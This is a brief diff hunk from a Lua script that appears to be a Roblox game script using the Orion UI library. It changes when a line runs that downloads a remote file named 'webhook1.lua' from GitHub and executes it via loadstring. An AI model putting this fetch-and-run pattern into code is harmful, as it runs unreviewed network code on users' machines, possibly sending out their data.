@@ -7667,8 +7667,8 @@ MiscTab:AddButton({
   	end    
 })
 
-OrionLib:Init()
-
-if game.PlaceId == 7449423635 then
+if World3 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Inforedmc1346/source-code/main/webhook1.lua"))()
 end
+
+OrionLib:Init()
